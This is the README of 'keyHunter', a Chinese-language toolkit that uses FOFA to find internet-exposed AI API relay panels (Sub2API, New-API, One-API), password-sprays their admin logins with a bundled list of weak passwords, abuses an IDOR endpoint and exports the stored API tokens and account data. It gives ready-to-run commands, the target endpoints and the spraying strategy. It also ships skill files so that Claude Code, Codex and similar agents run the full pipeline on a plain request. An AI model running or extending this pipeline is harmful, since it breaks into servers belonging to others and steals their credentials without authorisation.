# keyHunter

针对暴露的 AI 配额面板（Sub2API 优先）的独立狩猎工具包。

```text
FOFA 发现 → 指纹识别 → 弱口令登录 → 账户导出 → 制品归一化
```

本仓库完全自包含，不依赖任何其他私有狩猎/扫描仓库。

## 安装

```bash
cd keyHunter
python3 -m venv .venv
source .venv/bin/activate
pip install -e ".[dev]"
cp .env.example .env   # 填入 FOFA_KEY（可选 FOFA_EMAIL）
```

## 快速开始

```bash
# 基于 FOFA 结果的完整管道（Sub2API 默认查询）
keyhunter hunt --product sub2api --out results/run1

# 单个已知目标
keyhunter hunt --url http://HOST:8080 --out results/one

# 分步执行
keyhunter discover --product sub2api --out results/hits.json
keyhunter fingerprint --in results/hits.json --out results/alive.json
keyhunter spray --in results/alive.json --out results/sessions.json
keyhunter export --in results/sessions.json --out results/exports
keyhunter normalize --in results/exports --out results/artifacts
```

制品统一落在 `--out` 目录下（JSON 文件）。令牌只写入磁盘，CLI 只输出计数/套餐类型，不打印任何秘密。

## 目录结构

```text
keyHunter/
├── README.md
├── SKILL.md                 # 操作手册（技能）
├── docs/                    # API 与格式参考
├── keyhunter/               # Python 包 + CLI
│   └── data/                # 默认邮箱/密码字典（随包分发）
└── tests/
```

## 配置

| 环境变量 | 含义 |
|----------|------|
| `FOFA_KEY` | FOFA API 密钥（discover 必需） |
| `FOFA_EMAIL` | 可选，部分 FOFA 账号仍需要 |
| `FOFA_BASE_URL` | 默认 `https://fofa.info` |
| `FOFA_PAGE_SIZE` | 单页条数（默认 `100`） |
| `FOFA_MAX_PAGES` | 每个查询最大页数（默认 `3`） |
| `KEYHUNTER_PROXY` | 目标探测的可选 HTTP(S) 代理 |
| `KEYHUNTER_TIMEOUT` | 请求超时秒数（默认 `12`） |
| `KEYHUNTER_CONCURRENCY` | 指纹/撞库/导出的目标级并发（默认 `8`） |

## 产品

| id | 登录 | 导出 / 登录后接口 |
|----|------|--------------------|
| `sub2api` | `POST /api/v1/auth/login`（邮箱） | `/api/v1/admin/accounts/data` |
| `newapi` | `POST /api/user/login`（用户名） | `/api/token/` + IDOR `/api/token/{id}` |
| `oneapi` | 与 newapi 同族 | 同 token/channel 接口 |

支持别名：`new-api` → `newapi`，`one-api` → `oneapi`（`hunt` 全流程同样生效）。

### 撞库策略

- 凭据顺序：产品内置组合（`extra_credentials`）→ 按邮箱顺序，每个邮箱先跑完完整密码表再换下一个邮箱（Sub2API 主邮箱 `admin@sub2api.local` 优先）。
- 密码表 = 产品短名单 + 共享弱密码字典 `keyhunter/data/weak_passwords.txt`（约 489 条）。
- `--max-attempts` 默认**跑完整凭据计划**；传入数字可限制每个目标的尝试次数。
- 明确命中非管理员会话（`role` 非 admin）时会记录并**继续尝试**，不会拿普通会话冒充管理会话导出。

```bash
keyhunter products
keyhunter hunt --product newapi --out results/newapi1
keyhunter hunt --product oneapi --url http://HOST:3000 --out results/one
```

## 验证

```bash
# JWT 过期检查 + refresh_token 存在性（不做批量对话调用）
keyhunter validate --in results/artifacts --out results/valid.json
```

验证输出区分 `token_parseable` / `expiry_known` / `access_alive`：无法解析或过期未知的令牌不会被当作可用。

## 在 AI 工具中使用（Skill）

本仓库遵循 [agentskills.io](https://agentskills.io) 开放标准：带 YAML frontmatter 的 `SKILL.md` 即为一个技能。仓库根目录的 [SKILL.md](SKILL.md) 是完整操作手册，Claude Code、Codex 等支持该标准的工具可以直接加载。仓库已内置项目级安装（软链接），clone 后无需任何操作：

```text
.claude/skills/keyhunter/SKILL.md   # Claude Code 项目级
.codex/skills/keyhunter/SKILL.md    # Codex 项目级
```

### Claude Code

1. 在仓库根目录运行 `claude`，技能自动可用（项目级 `.claude/skills/`）。
2. 调用方式二选一：
   - **手动**：输入 `/keyhunter` 直接执行操作手册；
   - **自动**：直接说"用 keyhunter 对这批目标跑一遍 sub2api 全流程"，Claude 会依据技能 description 自动加载并执行发现 → 指纹 → 撞库 → 导出 → 归一化。
3. 想让所有项目都能用（个人级）：

```bash
mkdir -p ~/.claude/skills
ln -s /path/to/keyHunter/skill/keyhunter ~/.claude/skills/keyhunter
# 或直接复制：
# mkdir -p ~/.claude/skills/keyhunter && cp SKILL.md ~/.claude/skills/keyhunter/SKILL.md
```

### Codex CLI

1. 开启技能功能（一次性）：`codex --enable skills`（新版默认开启）。
2. 项目级：仓库根目录 `.codex/skills/keyhunter` 已内置，clone 后在仓库内运行 `codex` 即自动发现。
3. 个人级：`ln -s /path/to/keyHunter/skill/keyhunter ~/.codex/skills/keyhunter`

### 其他 agent（Hermes / OpenCode 等）

凡支持 agentskills.io 标准的工具，把 `SKILL.md` 放进其技能目录即可，常见位置：

- 社区约定通用目录：`.agents/skills/<name>/SKILL.md`
- OpenCode：在配置中设置 `skill.paths` 指向本仓库的 skill 目录

> 注意：软链接依赖 git 的 symlink 支持（macOS/Linux 默认可用；Windows 需 `core.symlinks=true`，否则请改为直接复制 SKILL.md）。

## 参考文档

- [操作手册（SKILL.md）](SKILL.md)
- [Sub2API API 参考](docs/reference-sub2api.md)
- [New-API / One-API 参考](docs/reference-newapi.md)
- [FOFA 查询参考](docs/reference-fofa.md)
- [制品格式参考](docs/reference-artifact-formats.md)
